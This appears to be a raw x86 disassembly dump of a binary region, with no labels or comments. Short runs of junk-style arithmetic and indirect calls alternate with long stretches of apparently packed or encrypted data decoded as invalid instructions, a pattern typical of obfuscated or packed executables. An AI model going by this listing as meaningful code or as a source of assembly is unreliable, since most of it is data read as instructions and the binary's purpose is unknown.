  420500:	mov    DWORD PTR ds:0x428353,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x4282ef
  42051b:	cmp    DWORD PTR ds:0x4281eb,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428f28
  420543:	mov    esi,DWORD PTR ds:0x4281db
  420549:	sbb    DWORD PTR ds:0x4281f7,esi
  42054f:	and    DWORD PTR ds:0x4282f3,edx
  420555:	sbb    DWORD PTR ds:0x4282a7,edx
  42055b:	mov    esi,DWORD PTR ds:0x4283df
  420561:	or     DWORD PTR ds:0x4283e3,esi
  420567:	mov    esi,DWORD PTR ds:0x428207
  42056d:	mov    edx,DWORD PTR ds:0x42839f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x4283df,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x4281d3,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283f7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428293,0x2222
  4205bd:	not    DWORD PTR ds:0x4282a3
  4205c3:	cmp    DWORD PTR ds:0x4281d3,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283ff
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428eac
  4205e8:	xor    edx,DWORD PTR ds:0x4282a7
  4205ee:	mov    ecx,DWORD PTR ds:0x42828f
  4205f4:	or     DWORD PTR ds:0x4281bf,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428333
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283fb,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x4282db
  42061a:	xor    DWORD PTR ds:0x4282c7,edx
  420620:	movzx  ecx,WORD PTR ds:0x4282b3
  420627:	and    ecx,DWORD PTR ds:0x4283eb
  42062d:	mov    DWORD PTR ds:0x4282b3,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283ff,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	aaa    
  42066f:	mov    ds:0x1dac7e21,eax
  420674:	push   ss
  420675:	sbb    BYTE PTR [ebx+0x47181812],ah
  42067b:	xor    ebp,DWORD PTR [edi+esi*8]
  42067e:	stos   BYTE PTR es:[edi],al
  42067f:	pop    ss
  420680:	jl     0x4206e2
  420682:	clc    
  420683:	sub    al,0x2e
  420685:	test   al,0x20
  420687:	and    bl,al
  420689:	scas   al,BYTE PTR es:[edi]
  42068a:	xor    cl,dl
  42068c:	jl     0x42070b
  42068e:	in     al,0xa9
  420690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420691:	(bad)  
  420692:	mov    esp,0x228fe2d9
  420697:	mov    ds:0xd690180f,eax
  42069c:	out    0xa4,al
  42069e:	sar    al,1
  4206a0:	sub    eax,0x1a4fb41e
  4206a5:	xchg   ebp,eax
  4206a6:	data16 jle 0x42070a
  4206a9:	repz mov ?,esi
  4206ac:	test   al,0x15
  4206ae:	inc    edx
  4206af:	sbb    cl,ch
  4206b1:	nop
  4206b2:	cli    
  4206b3:	xchg   BYTE PTR [ebx+eiz*8-0x7f],al
  4206b7:	leave  
  4206b8:	scas   eax,DWORD PTR es:[edi]
  4206b9:	(bad)  
  4206bb:	push   0x79
  4206bd:	mov    ah,0x29
  4206bf:	clc    
  4206c0:	ficomp WORD PTR [ebx-0x38]
  4206c3:	int3   
  4206c4:	out    dx,al
  4206c5:	enter  0x98f1,0xd7
  4206c9:	jb     0x420669
  4206cb:	cmp    DWORD PTR [ecx],ebx
  4206cd:	inc    esp
  4206ce:	add    eax,0x6d92b712
  4206d3:	loop   0x420655
  4206d5:	int3   
  4206d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206d7:	sahf   
  4206d8:	fisub  WORD PTR [edx+esi*1]
  4206db:	and    DWORD PTR fs:[ecx-0x2e],ecx
  4206df:	xchg   BYTE PTR [edi],ah
  4206e1:	push   0x61ffadbd
  4206e6:	das    
  4206e7:	int    0x44
  4206e9:	call   0x568d:0x61bb4d3d
  4206f0:	hlt    
  4206f1:	mov    edi,0xb2b15a6c
  4206f6:	xchg   ebx,eax
  4206f7:	dec    edi
  4206f8:	inc    ebx
  4206f9:	ret    0xcf98
  4206fc:	cmp    ecx,DWORD PTR [ebx-0x4b]
  4206ff:	pop    edi
  420700:	cmp    esi,DWORD PTR [eax]
  420702:	xchg   ecx,eax
  420703:	adc    ch,dh
  420705:	bound  ebp,QWORD PTR [ecx]
  420707:	jecxz  0x420729
  420709:	imul   ebx,DWORD PTR [eax+ebx*8],0xa7d5063a
  420710:	push   0x78319893
  420715:	pop    esp
  420716:	inc    eax
  420717:	sahf   
  420718:	pop    eax
  420719:	push   ebx
  42071a:	sub    al,0xc3
  42071c:	sub    ecx,eax
  42071e:	in     al,0xde
  420720:	mov    eax,0xfb083b48
  420725:	mov    ebp,0x2408adb8
  42072a:	aad    0x27
  42072c:	sub    ebx,ebx
  42072e:	cs sbb eax,0xe0b15918
  420734:	cli    
  420735:	mov    ebp,0x71751db0
  42073b:	jl     0x420780
  42073d:	or     al,0x44
  42073f:	mov    bl,0xea
  420741:	inc    ebp
  420742:	test   DWORD PTR [esi-0x630784ae],0xf5040e4d
  42074c:	pusha  
  42074d:	fstp   TBYTE PTR [ecx]
  42074f:	mov    dl,0xc0
  420751:	sub    ch,BYTE PTR [ecx+0x43]
  420754:	pop    es
  420755:	cmp    al,0xca
  420757:	mov    ebx,0x33c76bc7
  42075c:	add    al,0x47
  42075e:	pop    ebp
  42075f:	mov    ecx,0x4a63ac1f
  420764:	lods   al,BYTE PTR ds:[esi]
  420765:	mov    ch,0xa0
  420767:	adc    BYTE PTR ds:0x9f14a8bf,bl
  42076d:	mov    eax,0xdb25aabe
  420772:	inc    eax
  420773:	push   cs
  420774:	xor    esi,ecx
  420776:	push   cs
  420777:	cs dec edx
  420779:	or     bh,BYTE PTR [ebx-0x488023eb]
  42077f:	sub    BYTE PTR [ebx+0xe],bh
  420782:	lock pop ss
  420784:	in     eax,dx
  420785:	loopne 0x420716
  420787:	push   edx
  420788:	and    al,0xeb
  42078a:	adc    BYTE PTR [edx],ch
  42078c:	pop    edi
  42078d:	loope  0x4207c1
  42078f:	popa   
  420790:	mov    dl,BYTE PTR [ebp-0x5c60acdf]
  420796:	jo     0x420777
  420798:	loope  0x420815
  42079a:	pop    esi
  42079b:	sbb    edi,DWORD PTR [ebx+ecx*2+0x6efa6441]
  4207a2:	and    eax,0xbc910685
  4207a7:	mov    esi,0x6f393f30
  4207ac:	jp     0x4207e9
  4207ae:	add    BYTE PTR [eax+0x4a],bh
  4207b1:	ret    
  4207b2:	adc    al,0x43
  4207b4:	dec    eax
  4207b5:	jmp    0xd324:0x8ec82f3d
  4207bc:	pop    ds
  4207bd:	add    ch,ah
  4207bf:	rcr    BYTE PTR [edi],cl
  4207c1:	sub    bh,cl
  4207c3:	sub    eax,0xcfae7af3
  4207c8:	jo     0x420787
  4207ca:	add    bl,BYTE PTR [edi-0x8]
  4207cd:	cmc    
  4207ce:	pusha  
  4207cf:	mov    WORD PTR [edx+eax*4],gs
  4207d2:	jae    0x420815
  4207d4:	or     BYTE PTR [edx],dh
  4207d6:	dec    ebx
  4207d7:	enter  0x5ded,0x36
  4207db:	push   edi
  4207dc:	hlt    
  4207dd:	jg     0x4207fb
  4207df:	out    0x71,al
  4207e1:	test   BYTE PTR [ebx],dh
  4207e3:	std    
  4207e4:	and    BYTE PTR [esp+edx*4+0x7e],ah
  4207e8:	lds    edi,FWORD PTR [edx+ebp*2+0x6abebd0b]
  4207ef:	xor    BYTE PTR [eax*1-0x23766ffb],dh
  4207f6:	xchg   esp,eax
  4207f7:	into   
  4207f8:	jns    0x42079a
  4207fa:	cld    
  4207fb:	mov    al,0x75
  4207fd:	cs loope 0x4207e5
  420800:	xchg   ecx,eax
  420801:	push   eax
  420802:	sub    dh,bl
  420804:	fstp   QWORD PTR [eax-0x60d1dce8]
  42080a:	push   ebp
  42080b:	nop
  42080c:	loop   0x420807
  42080e:	fcmovne st,st(6)
  420810:	lods   eax,DWORD PTR ds:[esi]
  420811:	xchg   ebx,eax
  420812:	sub    BYTE PTR [esi-0x9d68fdf],dl
  420818:	add    BYTE PTR [ebx+0x8d6b6e4],dl
  42081e:	fistp  DWORD PTR [eax]
  420820:	mov    ah,0xd1
  420822:	xchg   ecx,eax
  420823:	nop
  420824:	clc    
  420825:	jne    0x42088c
  420827:	loopne 0x4208a1
  420829:	aam    0x45
  42082b:	add    DWORD PTR [esp+eiz*8],ebx
  42082e:	imul   edx,DWORD PTR [edx+0x30],0x5d
  420832:	push   ebp
  420833:	hlt    
  420834:	and    DWORD PTR ds:0xc979a71b,0x19
  42083b:	cmc    
  42083c:	aaa    
  42083d:	mov    BYTE PTR [eax+0x19f9116f],dh
  420843:	pop    ds
  420844:	xchg   ecx,eax
  420845:	test   eax,0x29fb9bde
  42084a:	xor    DWORD PTR [ebx],eax
  42084c:	pop    ebp
  42084d:	and    BYTE PTR [eax+0x5d6c7d9a],al
  420853:	mov    ebp,0x4eadeb7
  420858:	std    
  420859:	loope  0x4207fe
  42085b:	dec    edx
  42085c:	cmp    esp,esi
  42085e:	jmp    0x42081c
  420860:	mov    bl,0xd4
  420862:	sti    
  420863:	sahf   
  420864:	and    ah,BYTE PTR [ebx]
  420866:	pop    es
  420867:	inc    edx
  420868:	pop    ds
  420869:	push   es
  42086a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42086b:	pop    esi
  42086c:	dec    esi
  42086d:	imul   esi,DWORD PTR [edx],0xffffffd9
  420870:	outs   dx,DWORD PTR ds:[esi]
  420871:	call   0x1b4d:0x734cff7
  420878:	push   esi
  420879:	and    esp,DWORD PTR ds:0xf838e857
  42087f:	fiadd  WORD PTR [ecx-0x24d6bfe0]
  420885:	or     al,0x20
  420887:	xor    eax,DWORD PTR [eax+0x63]
  42088a:	enter  0x17b7,0x78
  42088e:	mov    eax,ds:0x64be44b8
  420893:	test   DWORD PTR [ecx-0x62b5d816],edi
  420899:	sub    eax,0x1d455b7a
  42089e:	(bad)  
  42089f:	repz jmp 0x42090a
  4208a2:	xor    al,bl
  4208a4:	adc    DWORD PTR [eax-0x6],esp
  4208a7:	sti    
  4208a8:	mov    WORD PTR [edx],gs
  4208aa:	mov    al,ds:0x728d0fce
  4208af:	and    al,0xb8
  4208b1:	aas    
  4208b2:	(bad)  
  4208b3:	pop    ebp
  4208b4:	and    edi,ecx
  4208b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208b7:	sbb    DWORD PTR [ebp+0x2c182396],0xe8569619
  4208c1:	or     BYTE PTR [ebx+0x51b53d80],al
  4208c7:	xchg   edx,eax
  4208c8:	js     0x42086a
  4208ca:	jae    0x4208c5
  4208cc:	mov    bl,BYTE PTR [edx-0x1a]
  4208cf:	push   edx
  4208d0:	ja     0x4208be
  4208d2:	jno    0x420893
  4208d4:	xlat   BYTE PTR ds:[ebx]
  4208d5:	mov    eax,0x7a3b8834
  4208da:	hlt    
  4208db:	dec    edx
  4208dc:	sbb    eax,0xb554c94
  4208e1:	xor    eax,0x33c865c8
  4208e6:	out    dx,al
  4208e7:	jmp    0x47818ae0
  4208ec:	inc    ecx
  4208ed:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4208ef:	test   BYTE PTR ds:0xe86e0fc9,bh
  4208f5:	push   0x5d4fb73f
  4208fa:	mov    ch,0xd7
  4208fc:	aam    0xc3
  4208fe:	(bad)  
  4208ff:	clc    
  420900:	or     BYTE PTR [edx+eiz*4],dh
  420903:	jmp    DWORD PTR [edi+0xb]
  420906:	int3   
  420907:	xor    al,0x82
  420909:	pop    edi
  42090a:	adc    ch,0x5d
  42090d:	inc    edi
  42090e:	pop    edx
  42090f:	retf   
  420910:	dec    ecx
  420911:	call   0x87dd:0x173e9018
  420918:	mov    bl,0xf5
  42091a:	mov    dh,0x48
  42091c:	inc    esi
  42091d:	add    ebx,DWORD PTR gs:[eax+0x7fde7ecf]
  420924:	outs   dx,DWORD PTR ds:[esi]
  420925:	add    eax,0x8919f05c
  42092a:	neg    BYTE PTR [ecx-0x15e90446]
  420930:	stos   BYTE PTR es:[edi],al
  420931:	xor    DWORD PTR [eax-0x485ac690],0xfc0d2341
  42093b:	cs jmp 0x42096c
  42093e:	retf   0x46d8
  420941:	ret    
  420942:	mov    ?,WORD PTR [ebx-0x4b241072]
  420948:	lahf   
  420949:	pop    es
  42094a:	or     eax,0x4f2bfecf
  42094f:	js     0x420974
  420951:	mov    ch,0xf4
  420953:	imul   eax,DWORD PTR [edi+0x23],0xa
  420957:	vpor   ymm0,ymm0,YMMWORD PTR [edx-0x41]
  42095c:	fs je  0x4208fb
  42095f:	popa   
  420960:	popa   
  420961:	lea    edi,[edx-0x5c]
  420964:	(bad)  
  420965:	ss call 0x4fc8:0xad235fb7
  42096d:	inc    eax
  42096e:	popf   
  42096f:	outs   dx,DWORD PTR ds:[esi]
  420970:	popf   
  420971:	or     BYTE PTR [esi+0x56],0xad
  420975:	mov    al,ds:0x96fb4a6c
  42097a:	data16 jae 0x420936
  42097d:	fcomp  QWORD PTR [edx+0x7c4a2e7]
  420983:	(bad)  
  420984:	mov    ebx,0x47c1f06b
  420989:	popf   
  42098a:	cmp    eax,0xe53a830d
  42098f:	jl     0x42095c
  420991:	and    eax,0x6b6d17fd
  420996:	xchg   edi,eax
  420997:	test   esp,ecx
  420999:	pop    eax
  42099a:	jp     0x4209cc
  42099c:	call   0x2fed:0x7b6ddaa
  4209a3:	aaa    
  4209a4:	out    0x93,eax
  4209a6:	imul   ebx,DWORD PTR [edi],0x4f136878
  4209ac:	cli    
  4209ad:	sbb    ch,al
  4209af:	stos   BYTE PTR es:[edi],al
  4209b0:	pop    ds
  4209b1:	imul   ebx,DWORD PTR [esi+ebx*1],0x16
  4209b5:	pop    eax
  4209b6:	imul   ebx,DWORD PTR [eax+0x6c85c7f4],0xffffffff
  4209bd:	(bad)  
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x4282c3
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42835f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428387,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42829f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x4281cb,0x6139
  420a0d:	mov    DWORD PTR ds:0x428403,0x3849
  420a17:	cmp    DWORD PTR ds:0x428387,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428eb0
  420a34:	sub    DWORD PTR ds:0x42835b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42828f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x4282eb
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42835b
  420a66:	sub    DWORD PTR ds:0x42836f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x4281cf
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x4282e3,0x0
  420a81:	mov    DWORD PTR ds:0x42834b,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428383
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x4282cb,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x4282e3,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428eb4
  420abd:	mov    esi,DWORD PTR ds:0x4283cb
  420ac3:	or     DWORD PTR ds:0x4282f3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428203
  420ad1:	mov    esi,DWORD PTR ds:0x428447
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x4281cb
  420ae2:	or     DWORD PTR ds:0x4282f3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428353,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x89
  420b0e:	ret    0xb07b
  420b11:	ss pop ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx+0x1181812],ah
  420b1a:	mov    bl,0xa9
  420b1c:	das    
  420b1d:	pushf  
  420b1e:	inc    ebx
  420b1f:	sub    esi,eax
  420b21:	pop    ds
  420b22:	pop    eax
  420b23:	ja     0x420b4a
  420b25:	jmp    0x420b2b
  420b27:	cmp    DWORD PTR [esi-0x23],0x4d370efc
  420b2e:	stc    
  420b2f:	mov    WORD PTR [ecx+0x2b],ds
  420b32:	xor    DWORD PTR [ebp-0x19d7ab55],eax
  420b38:	iret   
  420b39:	xchg   ebp,eax
  420b3a:	(bad)  
  420b3b:	out    0xe8,al
  420b3d:	sub    bl,bh
  420b3f:	(bad)
  420b43:	test   DWORD PTR [ecx],edx
  420b45:	fwait
  420b46:	outs   dx,DWORD PTR ds:[esi]
  420b47:	push   esp
  420b48:	adc    BYTE PTR [edi-0x3e],dl
  420b4b:	and    eax,0x16b65a65
  420b50:	cmp    esi,esp
  420b52:	xchg   BYTE PTR [edi+ebx*1],al
  420b55:	or     DWORD PTR [ebp+edi*8-0x61],edi
  420b59:	enter  0x9a27,0x68
  420b5d:	mov    DWORD PTR [edi],ecx
  420b5f:	clc    
  420b60:	xchg   edi,eax
  420b61:	loope  0x420bcb
  420b63:	shl    BYTE PTR [edx],0x97
  420b66:	pop    edx
  420b67:	and    DWORD PTR [ecx-0x9],ebp
  420b6a:	mov    ds:0x3a8053c6,al
  420b6f:	sbb    edi,DWORD PTR [edi-0x3e]
  420b72:	repnz lods al,BYTE PTR ds:[esi]
  420b74:	cwde   
  420b75:	pop    ebx
  420b76:	lods   al,BYTE PTR gs:[esi]
  420b78:	test   BYTE PTR [edx-0xa],0xe0
  420b7c:	sbb    BYTE PTR [esi],dh
  420b7e:	or     BYTE PTR [edi+edi*2-0x80d0788],ah
  420b85:	aaa    
  420b86:	(bad)  
  420b87:	in     eax,dx
  420b88:	inc    edi
  420b89:	sbb    al,0xb9
  420b8b:	pop    edx
  420b8d:	in     al,0x8f
  420b8f:	std    
  420b90:	popa   
  420b91:	push   ebp
  420b92:	mov    eax,ds:0x73d3c0c3
  420b97:	ins    DWORD PTR es:[edi],dx
  420b98:	push   edi
  420b99:	mov    eax,0x1cdc95b6
  420b9e:	cwde   
  420b9f:	imul   esi,esp,0x762be3c2
  420ba5:	add    BYTE PTR [edx-0x577f4195],al
  420bab:	js     0x420b54
  420bad:	mov    edi,0xee9cb0d5
  420bb2:	lock dec eax
  420bb4:	push   0xf22542f2
  420bb9:	aaa    
  420bba:	sar    DWORD PTR [ecx],1
  420bbc:	call   0xb7b358de
  420bc1:	dec    esp
  420bc2:	lds    ecx,FWORD PTR [ebx]
  420bc4:	inc    eax
  420bc5:	rol    dl,0xfc
  420bc8:	push   eax
  420bc9:	and    ebx,DWORD PTR [edx-0x20]
  420bcc:	cmp    al,0xe
  420bce:	shl    esp,1
  420bd0:	inc    eax
  420bd1:	stc    
  420bd2:	inc    edx
  420bd3:	loopne 0x420bf1
  420bd5:	nop/reserved BYTE PTR [edi-0x7a691d2]
  420bdc:	push   0x38cf2f70
  420be1:	mov    ss,WORD PTR [eax]
  420be3:	xor    DWORD PTR [ebp-0x6ba09cf7],eax
  420be9:	jae    0x420bb1
  420beb:	int    0x16
  420bed:	ret    0xc27d
  420bf0:	scas   eax,DWORD PTR es:[edi]
  420bf1:	hlt    
  420bf2:	pop    es
  420bf3:	outs   dx,DWORD PTR ds:[esi]
  420bf4:	adc    al,0x3a
  420bf6:	ret    
  420bf7:	das    
  420bf8:	pop    ecx
  420bf9:	sahf   
  420bfa:	fisttp WORD PTR [edi+ecx*1+0x36]
  420bfe:	daa    
  420bff:	xchg   edi,eax
  420c00:	cmp    ebp,ecx
  420c02:	jl     0x420bcf
  420c04:	push   esp
  420c05:	xchg   esp,eax
  420c06:	in     al,dx
  420c07:	xchg   BYTE PTR [eax+ecx*8-0x7994e61b],dh
  420c0e:	pusha  
  420c0f:	scas   al,BYTE PTR es:[edi]
  420c10:	push   cs
  420c11:	mov    ch,0x66
  420c13:	pop    ecx
  420c14:	pusha  
  420c15:	in     al,0xfd
  420c17:	pop    ebp
  420c18:	push   ecx
  420c19:	outs   dx,BYTE PTR ds:[esi]
  420c1a:	mov    esi,0x78baa151
  420c1f:	or     ch,BYTE PTR [ebp+0x11]
  420c22:	sahf   
  420c23:	popf   
  420c24:	xchg   ebp,eax
  420c25:	mov    bh,0x2e
  420c27:	hlt    
  420c28:	test   DWORD PTR [eax-0x32ed8f28],esi
  420c2e:	popa   
  420c2f:	inc    ecx
  420c30:	outs   dx,DWORD PTR ds:[esi]
  420c31:	mov    es,WORD PTR [esi+0x1c7b6adb]
  420c37:	ret    
  420c38:	out    dx,al
  420c39:	call   0xf7ea5a5f
  420c3e:	cmp    DWORD PTR [ebx+eax*1+0xb],edx
  420c42:	mov    ecx,0x3cd7fd46
  420c47:	jb     0x420bd6
  420c49:	inc    eax
  420c4a:	inc    ecx
  420c4b:	pushf  
  420c4c:	sbb    eax,0x9fe3a25c
  420c51:	repnz inc ebx
  420c53:	(bad)  
  420c55:	pop    esp
  420c56:	das    
  420c57:	add    ebx,edi
  420c59:	cmp    BYTE PTR [ebp+edi*8-0x5b],dl
  420c5d:	stos   BYTE PTR es:[edi],al
  420c5e:	loope  0x420c9e
  420c60:	jle    0x420c2d
  420c62:	sub    al,0xd9
  420c64:	mov    gs,WORD PTR [ebp+0x5bc23d67]
  420c6a:	cmc    
  420c6b:	adc    bh,dl
  420c6d:	sbb    DWORD PTR [eax+0x19c14c30],esi
  420c73:	fldenv [ebp+0x1f]
  420c76:	push   0xbc6080e9
  420c7b:	(bad)  
  420c7d:	fadd   DWORD PTR [eax]
  420c7f:	sbb    dl,BYTE PTR [ecx]
  420c81:	xchg   ecx,eax
  420c82:	fist   DWORD PTR [eax-0x59fff063]
  420c88:	mov    BYTE PTR [edx+0x25a07198],0x2d
  420c8f:	ds (bad) 
  420c91:	fnstsw WORD PTR [ecx+0x2dfcce29]
  420c97:	xchg   ebp,eax
  420c98:	repz push esp
  420c9a:	enter  0x7bc6,0xf8
  420c9e:	mov    esi,0x1ed3dc5b
  420ca4:	stos   DWORD PTR es:[edi],eax
  420ca5:	dec    esp
  420ca6:	dec    edi
  420ca7:	ret    0xd24e
  420caa:	dec    esi
  420cab:	imul   esi,eax,0x5c
  420cae:	or     al,0x76
  420cb0:	push   ss
  420cb1:	dec    ecx
  420cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cb3:	fcomp  st(5)
  420cb5:	adc    edi,DWORD PTR [ebx-0x774bbb79]
  420cbb:	push   0x915fd649
  420cc0:	popf   
  420cc1:	xchg   esi,eax
  420cc2:	mov    al,BYTE PTR [edi+ebp*8-0x1a2347dc]
  420cc9:	sub    BYTE PTR [edi],0x97
  420ccc:	adc    BYTE PTR [esi],bl
  420cce:	shr    BYTE PTR [eax+eiz*1],1
  420cd1:	pop    ebx
  420cd2:	popa   
  420cd3:	ds xchg esp,eax
  420cd5:	mov    ds:0x2721de29,al
  420cda:	clc    
  420cdb:	retf   
  420cdc:	push   esp
  420cdd:	ror    BYTE PTR [esi],0xf9
  420ce0:	add    DWORD PTR [edi-0x2057fad],ebx
  420ce6:	mov    bh,0x13
  420ce8:	into   
  420ce9:	xchg   edi,eax
  420cea:	fs mul ah
  420ced:	dec    esi
  420cee:	pop    eax
  420cef:	pop    es
  420cf0:	loop   0x420ca1
  420cf2:	iret   
  420cf3:	jne    0x420d36
  420cf5:	popa   
  420cf6:	push   ss
  420cf7:	ins    DWORD PTR es:[edi],dx
  420cf8:	(bad)  
  420cf9:	in     eax,dx
  420cfa:	mov    eax,0xaa1db359
  420cff:	popf   
  420d00:	(bad)  
  420d01:	aam    0xcd
  420d03:	add    BYTE PTR [ecx+0x1e],dl
  420d06:	shl    DWORD PTR [eax],0x7e
  420d09:	lock imul ebp,DWORD PTR [ecx-0x6bbc0adf],0x7f4451ad
  420d14:	lds    esp,FWORD PTR [edx]
  420d16:	pop    ebp
  420d17:	push   eax
  420d18:	lods   al,BYTE PTR ds:[esi]
  420d19:	fs out 0x92,al
  420d1c:	adc    al,ah
  420d1e:	repz adc BYTE PTR [ecx-0x73],dh
  420d22:	in     al,0xd0
  420d24:	inc    ecx
  420d25:	push   edi
  420d26:	cdq    
  420d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d28:	jnp    0x420d1c
  420d2a:	xor    ah,BYTE PTR [esi-0x1e]
  420d2d:	push   esi
  420d2e:	and    bl,dl
  420d30:	pop    edi
  420d31:	dec    ecx
  420d32:	test   BYTE PTR [edi+0x15],cl
  420d35:	les    eax,FWORD PTR [esi]
  420d37:	adc    al,0xc5
  420d39:	call   0xb59dde5a
  420d3e:	sbb    DWORD PTR [esi-0x80],0xb919392f
  420d45:	adc    ebx,DWORD PTR [ebp+eiz*2-0x36]
  420d49:	fmul   st,st(4)
  420d4b:	hlt    
  420d4c:	adc    bh,cl
  420d4e:	(bad)  
  420d4f:	std    
  420d50:	fwait
  420d51:	inc    ebx
  420d52:	mov    DWORD PTR [eax-0x5ea06dd4],ebp
  420d58:	fisttp QWORD PTR [edx+0x245314c8]
  420d5e:	mov    ch,0x6
  420d60:	inc    esp
  420d61:	or     BYTE PTR [ecx],dh
  420d63:	loop   0x420d1c
  420d65:	mov    al,ds:0x56226fd9
  420d6a:	mov    dh,0xe5
  420d6c:	mov    DWORD PTR [ebx+0x7eee371c],ebx
  420d72:	mov    dl,0x72
  420d74:	pop    esi
  420d75:	dec    ebp
  420d76:	pusha  
  420d77:	dec    ecx
  420d78:	mov    dl,0xa8
  420d7a:	xor    eax,0xf846f1bc
  420d7f:	out    0x7e,eax
  420d81:	loope  0x420db5
  420d83:	pop    edi
  420d84:	fdivr  DWORD PTR [ebp-0x537b4ec]
  420d8a:	dec    edx
  420d8b:	icebp  
  420d8c:	in     eax,0xbc
  420d8e:	cmc    
  420d8f:	or     BYTE PTR [ecx],0x11
  420d92:	inc    edx
  420d93:	imul   ebx,ebx,0x169868d5
  420d99:	sbb    ebx,DWORD PTR [eax]
  420d9b:	fs mov cl,0xbf
  420d9e:	push   edi
  420d9f:	inc    ebp
  420da0:	in     al,0x91
  420da2:	imul   edi,esp,0x40
  420da5:	(bad)  
  420da7:	rcl    ebp,0xf2
  420daa:	mov    ch,0xc7
  420dac:	daa    
  420dad:	out    dx,eax
  420dae:	fldcw  WORD PTR [eax]
  420db0:	cmp    al,0x22
  420db2:	int    0x68
  420db4:	ins    DWORD PTR es:[edi],dx
  420db5:	sub    ah,BYTE PTR [ebp+0x14f12d8f]
  420dbb:	xor    BYTE PTR [edx],0x42
  420dbe:	int3   
  420dbf:	mov    dl,0x71
  420dc1:	dec    ebx
  420dc2:	fucomi st,st(1)
  420dc4:	jbe    0x420df5
  420dc6:	lods   al,BYTE PTR ds:[esi]
  420dc7:	pop    eax
  420dc8:	mov    ebx,0x57857dda
  420dcd:	aad    0x27
  420dcf:	aas    
  420dd0:	icebp  
  420dd1:	push   esp
  420dd2:	jae    0x420d5a
  420dd4:	mov    bh,0xbd
  420dd6:	lock mov dl,0x5b
  420dd9:	adc    esp,0x564c2bb5
  420ddf:	int    0xde
  420de1:	aad    0xc1
  420de3:	out    dx,eax
  420de4:	mov    ecx,0xcfcdef07
  420de9:	push   0xffffffdd
  420deb:	adc    al,0xe8
